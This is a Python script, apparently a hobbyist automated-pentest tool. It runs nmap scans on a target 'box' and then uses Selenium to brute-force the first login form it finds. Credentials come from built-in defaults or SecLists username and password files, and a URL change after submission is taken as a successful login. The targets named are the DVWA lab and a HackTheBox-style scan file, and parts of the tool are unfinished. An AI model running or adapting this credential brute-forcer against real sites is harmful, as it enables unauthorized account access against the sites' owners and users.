import os.path
import urllib
from pathlib import Path
from pprint import pprint
from typing import Optional, List, Union, Dict, Tuple

# please name me ;_;

import nmap3
from selenium import webdriver
from selenium.common.exceptions import WebDriverException
from selenium.webdriver.chrome.webdriver import WebDriver
from selenium.webdriver.common.by import By
from selenium.webdriver.remote.webelement import WebElement

from NMAPResult import NMAPResult


def test_chrome_webdriver() -> None:
    try:
        wd = webdriver.Chrome()
        wd.close()
    except (WebDriverException, FileNotFoundError) as wde:
        print("Please go to https://chromedriver.chromium.org/downloads and put the webdriver in PATH!")
        print("Alternatively, if on linux, run this in bash:\n\n")
        print("""

    # install chrome browser
    apt-get -y install chromium

    # install chromedriver
    if [ ! -f /bin/chromedriver ]; then
        pushd /tmp
        wget https://chromedriver.storage.googleapis.com/97.0.4692.71/chromedriver_linux64.zip
        unzip chromedriver_linux64.zip
        mv chromedriver /bin/
    fi\n\n""")
        raise wde


nmap = nmap3.Nmap()
SERVICE_NAMES = [
    'ssh', 'http',
]


class CredentialsDatabase:
    def __init__(self):
        pass


def determine_form_type(form: WebElement) -> str:
    """
    Use "advanced logic" and "epic facts" to determine what type of form a form is... wew
    :param form:
    :return:
    """
    if 'login' in form.get_attribute('action'):
        return 'login'

    raise NotImplementedError("Not sure what to do for this form: " + repr(form))


class Box:
    def __init__(self, name: str,
                 ip: Optional[str] = None, hostname: Optional[str] = None):
        self.name = name
        self.ip = ip
        self.hostname = hostname
        self.http_scanner = HttpModule(self)
        self.nmap_results: List[NMAPResult] = []
        self.service_ports: Dict[str, int] = {}

    def has_nmap_results(self):
        return len(self.nmap_results) > 0

    def last_nmap_result(self):
        if self.has_nmap_results():
            return self.nmap_results[-1]

        return False

    def get_ip_or_hostname(self):
        if self.ip:
            return self.ip

        if self.hostname:
            return self.hostname

        raise ValueError("Error! {} doesn't have an IP or Hostname!".format(self))

    def has_http_forms(self):
        if self.http_scanner.has_results():
            raise NotImplementedError("wowie check for le forms")

    def __repr__(self):
        return f"<Box name='{self.name}' online='{self.is_online()}' ip='{self.ip}' hostname='{self.hostname}'>"

    def get_service_port(self, serviceName: str) -> Union[int, None]:
        return self.service_ports.get(serviceName, None)

    def run_nmap_scan(self, args=('-sC', '-sV'), import_nmap_xml_filepath: str = None):

        if import_nmap_xml_filepath:
            with open(import_nmap_xml_filepath, 'r') as f:
                nmapres = NMAPResult(f.read())
        else:
            cmd = [nmap.nmaptool]
            cmd.extend(args)
            cmd.extend([self.get_ip_or_hostname(), '-oX', '-'])

            xml = nmap.run_command(cmd)

            nmapres = NMAPResult(xml)

        self.nmap_results.append(nmapres)

        for servicename in SERVICE_NAMES:
            if nmapres.getServicePort(servicename):
                self.service_ports[servicename] = nmapres.getServicePort(servicename)

        return self.nmap_results

    def is_online(self) -> bool:
        if not self.has_nmap_results():
            return False

        return self.last_nmap_result().isOnline()


def submit_form(form: WebElement) -> None:
    selector = '//input[@type="submit"]'
    input_elt: WebElement = form.find_element(By.XPATH, selector)
    if input_elt:
        input_elt.click()
        return

    form.submit()  # is this right?


def fill_form(form: WebElement, paramMap: Dict[str, str]) -> WebElement:
    for id in paramMap.keys():
        cred = paramMap[id]
        print(id, cred)

        selector = f'//input[@name="{id}"]'
        input_elt: WebElement = form.find_element(By.XPATH, selector)

        print(f"Filled {selector} with {cred}")

        input_elt.send_keys(cred)

    return form


def load_lines_from_file(p: Path, encoding='ascii') -> List[str]:
    with open(p, 'r', encoding=encoding) as f:
        return f.readlines()


class HttpModule:
    def __init__(self, box: Box):
        self.box = box

        # lazy init to fix chrome popping up
        self._webdriver: Union[WebDriver, None] = None

    def webdriver(self) -> WebDriver:
        """Get webdriver."""
        if not self._webdriver:
            self._webdriver = webdriver.Chrome()
        return self._webdriver

    def has_results(self):
        return False  # TODO NYI

    def build_url(self, protocol='http', slug=''):
        target = self.box.get_ip_or_hostname()
        servicePort = self.box.get_service_port(protocol)

        if not servicePort:
            raise ValueError(f"{protocol} has no service port! Examine nmap output.")

        return f"{protocol}://{target}:{servicePort}/{slug}"

    def initial_http_scan(self, protocol='http'):
        target = self.build_url(protocol)

        print(f"target={target}")

        try:
            self.webdriver().get(target)
        except ConnectionRefusedError as cre:
            print(f"Connection refused to {target}. Are you sure there is an HTTP server running?")
            raise cre
        except urllib.error.URLError as urle:
            print(f"Connection refused to {target}. Are you sure there is an HTTP server running?")
            raise urle

    # TODO: This method is extremely long... ;_; fugg DDDD:
    def bruteforce_form(
            self,
            target_url: str = None,
            slug: str = '',
            usernames: Union[Path, List[str]] = None,
            passwords: Union[Path, List[str]] = None
    ) -> Tuple[str, str]:

        if not target_url:
            target_url = self.build_url()

        if not usernames:
            usernames = ['bobby', 'robby', 'admin']

        if not passwords:
            passwords = ['foobarbazqux', 'wheresthebeef', 'password']

        if isinstance(usernames, Path):
            usernames = load_lines_from_file(usernames)

        if isinstance(passwords, Path):
            passwords = load_lines_from_file(passwords)

        assert (isinstance(passwords, list))
        assert (isinstance(passwords[0], str))
        assert (isinstance(usernames, list))
        assert (isinstance(usernames[0], str))

        if not self.has_results():
            self.initial_http_scan()

        target_url += slug

        print("Navigating to {}".format(target_url))
        self.webdriver().get(target_url)

        links: List[WebElement] = self.webdriver().find_elements(By.XPATH, '//a')
        print("links: ")
        pprint(links)

        all_forms: List[WebElement] = self.webdriver().find_elements(By.XPATH, '//form')
        print("forms: ")
        pprint(all_forms)

        # TODO: What if there are multiple forms? Or 0?
        if len(all_forms) <= 0:
            raise Exception("There are no forms! Cannot bruteforce!")

        if len(all_forms) > 1:
            raise NotImplementedError("There are >1 form! TODO: Choose one!")

        form_candidate = all_forms[0]

        if determine_form_type(form_candidate) != 'login':
            raise Exception("Cannot bruteforce this type of form: " + determine_form_type(form_candidate))

        print("about to bruteforce " + form_candidate.get_attribute('action'))

        # main fuzzer loop...
        # TODO can we use a different module to handle this?
        for username, password in zip(usernames, passwords):

            print("\ngoing to try {0}".format(":".join((username, password))))

            # store url we have before we send a request...
            last_url = self.webdriver().current_url

            # TODO: Don't hardcode these input names
            fill_form(form_candidate, {'username': username, 'password': password})
            submit_form(form_candidate)

            # must update reference to forms from the DOM
            all_forms = self.webdriver().find_elements(By.XPATH, '//form')
            form_candidate = all_forms[0] if len(all_forms) > 0 else None

            current_url: str = self.webdriver().current_url
            print("response url: " + current_url)

            if not (current_url == last_url):  # TODO: Formalize this heuristic, and what happens if it fails?
                print("Different URL!\n {} != {}\n"
                      " We will use this as the heuristic that proves this "
                      "form has been successfully brute-forced!".format(last_url, current_url))
                return username, password

        raise ValueError("Failed to find credentials for form '{}'!".format(self.webdriver().current_url))


def hackthe(box: Box) -> Box:
    # save time, import xml instead of running new nmap scan
    if box.name == 'dvwa':
        box.run_nmap_scan(import_nmap_xml_filepath='../data/DVWA.xml')
    else:
        box.run_nmap_scan()

    features = box.nmap_results[-1].extractFeatures()
    print(f'Vulnerability features of {box}:')
    pprint(features)

    if box.is_online():
        print(f"Most recent nmap scan says box {box} is online!")
    else:
        raise ConnectionError(f"Box {box} is offline!")

    if box.last_nmap_result().hasHTTPServer():
        print("target has an HTTP server!")

        creds = box.http_scanner.bruteforce_form()
        print("Login form creds: {}".format(creds))

        if box.name == 'dvwa':
            creds2 = box.http_scanner.bruteforce_form(
                slug='/vulnerabilities/brute/',
                usernames=Path(os.path.expanduser('~/Git/SecLists/Usernames/top-usernames-shortlist.txt')),
                passwords=Path(os.path.expanduser('~/Git/SecLists/Passwords/darkweb2017-top100.txt'))
            )

            print("DVWA bruteforce test creds: {}".format(creds2))

    return box


def familyfriendlyWithDummyNMAPresults():
    with open('../data/Horizontall.xml', 'r') as f:
        dummy_nmap_result = NMAPResult(raw_xml=f.read())

    gay1 = dummy_nmap_result.isOnline()

    gay2 = dummy_nmap_result.getServices('ssh')
    gay3 = dummy_nmap_result.hasHTTPServer()
    gay4 = dummy_nmap_result.hasSSH()
    print(" >:3c ")
